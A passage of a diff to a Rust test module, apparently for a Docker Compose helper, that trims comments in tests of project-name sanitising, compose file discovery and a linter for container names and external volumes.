         assert_eq!(compose_service("mailpit_8025", 8025), "mailpit");
     }
 
     #[test]
     fn project_name_is_compose_legal() {
-        // Lowercased, `/`-sanitized branch already legal.
         assert_eq!(project_name("feat-foo", "api"), "feat-foo-api");
-        // Uppercase + dot (sanitize_branch only strips slashes) → normalized.
         assert_eq!(project_name("Feat-JIRA-1.2", "api"), "feat-jira-1-2-api");
-        // A leading non-alphanumeric run is trimmed.
         assert_eq!(project_name("-x", "api"), "x-api");
     }
 
     #[test]
     fn base_files_ignores_a_mismatched_family_override() {
-        // A `compose.yaml` primary must not pick up a `docker-compose.override.yml`
-        // (compose's own discovery would never merge that pair).
+        // Compose's own discovery would never merge this pair.
         let dir = tempfile::tempdir().unwrap();
         std::fs::write(dir.path().join("compose.yaml"), "services: {}\n").unwrap();
         std::fs::write(dir.path().join("docker-compose.override.yml"), "services: {}\n").unwrap();
@@ -911,9 +764,8 @@ mod tests {
             "volumes": { "data": { "external": true }, "cache": { "name": "shared_cache" } }
         }"#;
         let findings = lint_json(json);
-        // Exactly the two unambiguous opt-outs: container_name + external volume.
-        // The pinned project `name` and the resolved volume `name` are NOT flagged
-        // (compose emits those for every clean project — see the module note).
+        // The pinned project `name` and the resolved volume `name` are not
+        // flagged — see `lint_findings`.
         assert_eq!(findings.len(), 2, "only the two reliable opt-outs: {findings:?}");
         assert!(findings.iter().any(|f| f.contains("container_name: myapp_db")), "{findings:?}");
         assert!(findings.iter().any(|f| f.contains("volume `data` is `external`")), "{findings:?}");
@@ -921,9 +773,8 @@ mod tests {
 
     #[test]
     fn lint_is_quiet_on_a_clean_project_with_resolved_names() {
-        // This is the real `compose config` shape: a project `name` and a
-        // project-prefixed volume `name` are ALWAYS emitted, even for a plain
-        // `data: {}`. Neither is a committed pin, so the lint must stay silent.
+        // The real `compose config` shape: both `name` fields are always emitted,
+        // even for a plain `data: {}`, so neither implies a committed pin.
         let json = r#"{
             "name": "api",
             "services": { "web": { "ports": [ {"target": 80} ] }, "db": {} },
@@ -934,8 +785,6 @@ mod tests {
 
     #[test]
     fn lint_survives_a_null_map_value() {
-        // A stray `null` service/volume value must not fail the whole parse (and
-        // silently drop real findings); it's just skipped.
         let json = r#"{"services":{"db":null,"x":{"container_name":"fixed"}},"volumes":{"v":null}}"#;
         let findings = lint_json(json);
         assert_eq!(findings.len(), 1, "null values skipped, real finding kept: {findings:?}");
@@ -951,8 +800,6 @@ mod tests {
         assert_eq!(files.len(), 2);
         assert!(files[0].ends_with("docker-compose.yml"));
         assert!(files[1].ends_with("docker-compose.override.yml"));
-
-        // No compose file → empty.
         assert!(base_files(tempfile::tempdir().unwrap().path()).is_empty());
     }
 }
